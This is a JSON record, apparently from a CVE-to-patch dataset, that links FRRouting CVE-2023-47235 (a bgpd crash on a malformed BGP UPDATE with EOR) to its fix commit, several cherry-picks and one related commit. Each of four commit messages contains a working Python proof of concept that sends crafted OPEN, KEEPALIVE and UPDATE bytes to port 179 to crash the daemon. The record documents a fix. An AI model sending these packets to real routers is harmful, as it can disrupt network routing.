{
  "cve_id": "CVE-2023-47235",
  "cve_desc": "An issue was discovered in FRRouting FRR through 9.0.1. A crash can occur when a malformed BGP UPDATE message with an EOR is processed, because the presence of EOR does not lead to a treat-as-withdraw outcome.",
  "repo": "FRRouting/frr",
  "patch_hash": "6814f2e0138a6ea5e1f83bdd9085d9a77999900b",
  "patch_info": {
    "commit_hash": "6814f2e0138a6ea5e1f83bdd9085d9a77999900b",
    "repo": "FRRouting/frr",
    "commit_url": "https://github.com/FRRouting/frr/pull/14716/commits/6814f2e0138a6ea5e1f83bdd9085d9a77999900b",
    "files": [
      "bgpd/bgp_attr.c"
    ],
    "message": "bgpd: Treat EOR as withdrawn to avoid unwanted handling of malformed attrs\n\nTreat-as-withdraw, otherwise if we just ignore it, we will pass it to be\nprocessed as a normal UPDATE without mandatory attributes, that could lead\nto harmful behavior. In this case, a crash for route-maps with the configuration\nsuch as:\n\n```\nrouter bgp 65001\n no bgp ebgp-requires-policy\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n !\n address-family ipv4 unicast\n  neighbor 127.0.0.1 addpath-tx-all-paths\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\nexit\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nSend a malformed optional transitive attribute:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(100)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
    "before_after_code_files": [
      "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
    ]
  },
  "patch_diff": {
    "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
      "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
      "--- Hunk 1 ---",
      "[Context before]",
      "3391:  uint8_t type = 0;",
      "3395:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
      "3396:      !length)",
      "3400:     to carry any other path attributes.\", though if MP_REACH_NLRI or NLRI",
      "",
      "[Removed Lines]",
      "3397:   return BGP_ATTR_PARSE_PROCEED;",
      "",
      "[Added Lines]",
      "3400:   return BGP_ATTR_PARSE_WITHDRAW;",
      "",
      "---------------",
      "--- Hunk 2 ---",
      "[Context before]",
      "3889:  aspath_unintern(&as4_path);",
      "3891:  transit = bgp_attr_get_transit(attr);",
      "3894:   if (transit)",
      "3895:    bgp_attr_set_transit(attr, transit_intern(transit));",
      "",
      "[Removed Lines]",
      "3892:  if (ret != BGP_ATTR_PARSE_ERROR) {",
      "",
      "[Added Lines]",
      "3901:  if (ret == BGP_ATTR_PARSE_PROCEED) {",
      "",
      "---------------"
    ]
  },
  "candidates": [
    {
      "candidate_hash": "fc87cdbf07c1afa9ae6a32f3570501f4cb990ae3",
      "candidate_info": {
        "commit_hash": "fc87cdbf07c1afa9ae6a32f3570501f4cb990ae3",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/fc87cdbf07c1afa9ae6a32f3570501f4cb990ae3",
        "files": [
          "bgpd/bgp_attr.c"
        ],
        "message": "bgpd: Treat EOR as withdrawn to avoid unwanted handling of malformed attrs\n\nTreat-as-withdraw, otherwise if we just ignore it, we will pass it to be\nprocessed as a normal UPDATE without mandatory attributes, that could lead\nto harmful behavior. In this case, a crash for route-maps with the configuration\nsuch as:\n\n```\nrouter bgp 65001\n no bgp ebgp-requires-policy\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n !\n address-family ipv4 unicast\n  neighbor 127.0.0.1 addpath-tx-all-paths\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\nexit\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nSend a malformed optional transitive attribute:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(100)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\n(cherry picked from commit 6814f2e0138a6ea5e1f83bdd9085d9a77999900b)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "3355:  uint8_t type = 0;",
          "3359:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
          "3360:      !length)",
          "3364:     to carry any other path attributes.\", though if MP_REACH_NLRI or NLRI",
          "",
          "[Removed Lines]",
          "3361:   return BGP_ATTR_PARSE_PROCEED;",
          "",
          "[Added Lines]",
          "3364:   return BGP_ATTR_PARSE_WITHDRAW;",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3788:  aspath_unintern(&as4_path);",
          "3790:  transit = bgp_attr_get_transit(attr);",
          "3793:   if (transit)",
          "3794:    bgp_attr_set_transit(attr, transit_intern(transit));",
          "",
          "[Removed Lines]",
          "3791:  if (ret != BGP_ATTR_PARSE_ERROR) {",
          "",
          "[Added Lines]",
          "3800:  if (ret == BGP_ATTR_PARSE_PROCEED) {",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "837f57f087c997e3d66f7d1f86bdec3149917aba",
      "candidate_info": {
        "commit_hash": "837f57f087c997e3d66f7d1f86bdec3149917aba",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/837f57f087c997e3d66f7d1f86bdec3149917aba",
        "files": [
          "bgpd/bgp_attr.c"
        ],
        "message": "bgpd: Treat EOR as withdrawn to avoid unwanted handling of malformed attrs\n\nTreat-as-withdraw, otherwise if we just ignore it, we will pass it to be\nprocessed as a normal UPDATE without mandatory attributes, that could lead\nto harmful behavior. In this case, a crash for route-maps with the configuration\nsuch as:\n\n```\nrouter bgp 65001\n no bgp ebgp-requires-policy\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n !\n address-family ipv4 unicast\n  neighbor 127.0.0.1 addpath-tx-all-paths\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\nexit\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nSend a malformed optional transitive attribute:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(100)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\n(cherry picked from commit 6814f2e0138a6ea5e1f83bdd9085d9a77999900b)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "3391:  uint8_t type = 0;",
          "3395:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
          "3396:      !length)",
          "3400:     to carry any other path attributes.\", though if MP_REACH_NLRI or NLRI",
          "",
          "[Removed Lines]",
          "3397:   return BGP_ATTR_PARSE_PROCEED;",
          "",
          "[Added Lines]",
          "3400:   return BGP_ATTR_PARSE_WITHDRAW;",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3889:  aspath_unintern(&as4_path);",
          "3891:  transit = bgp_attr_get_transit(attr);",
          "3894:   if (transit)",
          "3895:    bgp_attr_set_transit(attr, transit_intern(transit));",
          "",
          "[Removed Lines]",
          "3892:  if (ret != BGP_ATTR_PARSE_ERROR) {",
          "",
          "[Added Lines]",
          "3901:  if (ret == BGP_ATTR_PARSE_PROCEED) {",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "2adb85468e7b5edf39a8f0b30200fc4a8ed06240",
      "candidate_info": {
        "commit_hash": "2adb85468e7b5edf39a8f0b30200fc4a8ed06240",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/2adb85468e7b5edf39a8f0b30200fc4a8ed06240",
        "files": [
          "bgpd/bgp_attr.c"
        ],
        "message": "bgpd: Treat EOR as withdrawn to avoid unwanted handling of malformed attrs\n\nTreat-as-withdraw, otherwise if we just ignore it, we will pass it to be\nprocessed as a normal UPDATE without mandatory attributes, that could lead\nto harmful behavior. In this case, a crash for route-maps with the configuration\nsuch as:\n\n```\nrouter bgp 65001\n no bgp ebgp-requires-policy\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n !\n address-family ipv4 unicast\n  neighbor 127.0.0.1 addpath-tx-all-paths\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\nexit\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nSend a malformed optional transitive attribute:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(100)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\nSigned-off-by: Christian Breunig <christian@breunig.cc>\n\n(cherry picked from commit 6814f2e0138a6ea5e1f83bdd9085d9a77999900b)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2846:  uint8_t type = 0;",
          "2850:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)",
          "2853:  if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_ORIGIN)))",
          "2854:   type = BGP_ATTR_ORIGIN;",
          "",
          "[Removed Lines]",
          "2851:   return BGP_ATTR_PARSE_PROCEED;",
          "",
          "[Added Lines]",
          "2854:   return BGP_ATTR_PARSE_WITHDRAW;",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3273:   aspath_unintern(&as4_path);",
          "3274:  }",
          "3278:   if (attr->transit)",
          "3279:    attr->transit = transit_intern(attr->transit);",
          "",
          "[Removed Lines]",
          "3276:  if (ret != BGP_ATTR_PARSE_ERROR) {",
          "",
          "[Added Lines]",
          "3285:  if (ret == BGP_ATTR_PARSE_PROCEED) {",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "3f79135cc7683f71732cfa24e05e4fe3eaf5df47",
      "candidate_info": {
        "commit_hash": "3f79135cc7683f71732cfa24e05e4fe3eaf5df47",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/3f79135cc7683f71732cfa24e05e4fe3eaf5df47",
        "files": [
          "bgpd/bgp_attr.c"
        ],
        "message": "bgpd: Treat EOR as withdrawn to avoid unwanted handling of malformed attrs\n\nTreat-as-withdraw, otherwise if we just ignore it, we will pass it to be\nprocessed as a normal UPDATE without mandatory attributes, that could lead\nto harmful behavior. In this case, a crash for route-maps with the configuration\nsuch as:\n\n```\nrouter bgp 65001\n no bgp ebgp-requires-policy\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n !\n address-family ipv4 unicast\n  neighbor 127.0.0.1 addpath-tx-all-paths\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\nexit\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nSend a malformed optional transitive attribute:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(100)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>\n(cherry picked from commit 6814f2e0138a6ea5e1f83bdd9085d9a77999900b)",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "diff_branch_cherry_pick": 1,
        "diff_branch_same_aad": 1,
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "3112:  uint8_t type = 0;",
          "3116:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
          "3117:      !length)",
          "3121:     to carry any other path attributes.\", though if MP_REACH_NLRI or NLRI",
          "",
          "[Removed Lines]",
          "3118:   return BGP_ATTR_PARSE_PROCEED;",
          "",
          "[Added Lines]",
          "3121:   return BGP_ATTR_PARSE_WITHDRAW;",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3542:  aspath_unintern(&as4_path);",
          "3544:  transit = bgp_attr_get_transit(attr);",
          "3547:   if (transit)",
          "3548:    bgp_attr_set_transit(attr, transit_intern(transit));",
          "",
          "[Removed Lines]",
          "3545:  if (ret != BGP_ATTR_PARSE_ERROR) {",
          "",
          "[Added Lines]",
          "3554:  if (ret == BGP_ATTR_PARSE_PROCEED) {",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "c37119df45bbf4ef713bc10475af2ee06e12f3bf",
      "candidate_info": {
        "commit_hash": "c37119df45bbf4ef713bc10475af2ee06e12f3bf",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/c37119df45bbf4ef713bc10475af2ee06e12f3bf",
        "files": [
          "bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c"
        ],
        "message": "bgpd: Ignore handling NLRIs if we received MP_UNREACH_NLRI\n\nIf we receive MP_UNREACH_NLRI, we should stop handling remaining NLRIs if\nno mandatory path attributes received.\n\nIn other words, if MP_UNREACH_NLRI received, the remaining NLRIs should be handled\nas a new data, but without mandatory attributes, it's a malformed packet.\n\nIn normal case, this MUST not happen at all, but to avoid crashing bgpd, we MUST\nhandle that.\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/FRRouting/frr/pull/14716"
        ],
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "3399:      !length)",
          "3400:   return BGP_ATTR_PARSE_WITHDRAW;",
          "3411:  if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_ORIGIN)))",
          "3412:   type = BGP_ATTR_ORIGIN;",
          "",
          "[Removed Lines]",
          "3403:     to carry any other path attributes.\", though if MP_REACH_NLRI or NLRI",
          "3404:     are present, it should.  Check for any other attribute being present",
          "3405:     instead.",
          "3407:  if ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)) &&",
          "3408:       CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLRI))))",
          "3409:   return BGP_ATTR_PARSE_PROCEED;",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3426:      && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_LOCAL_PREF)))",
          "3427:   type = BGP_ATTR_LOCAL_PREF;",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "3425:  if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)) &&",
          "3426:      CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLRI)))",
          "3427:   return type ? BGP_ATTR_PARSE_MISSING_MANDATORY",
          "3428:        : BGP_ATTR_PARSE_PROCEED;",
          "",
          "---------------"
        ],
        "bgpd/bgp_attr.h||bgpd/bgp_attr.h": [
          "File: bgpd/bgp_attr.h -> bgpd/bgp_attr.h",
          "--- Hunk 1 ---",
          "[Context before]",
          "366:  BGP_ATTR_PARSE_ERROR_NOTIFYPLS = -3,",
          "367: };",
          "369: struct bpacket_attr_vec_arr;",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "367:  BGP_ATTR_PARSE_MISSING_MANDATORY = -4,",
          "",
          "---------------"
        ],
        "bgpd/bgp_packet.c||bgpd/bgp_packet.c": [
          "File: bgpd/bgp_packet.c -> bgpd/bgp_packet.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2360:  update_len = end - stream_pnt(s);",
          "2364:   nlris[NLRI_UPDATE].afi = AFI_IP;",
          "2365:   nlris[NLRI_UPDATE].safi = SAFI_UNICAST;",
          "",
          "[Removed Lines]",
          "2362:  if (update_len && attribute_len) {",
          "",
          "[Added Lines]",
          "2366:  if (update_len && attribute_len &&",
          "2367:      attr_parse_ret != BGP_ATTR_PARSE_MISSING_MANDATORY) {",
          "",
          "---------------"
        ]
      }
    }
  ]
}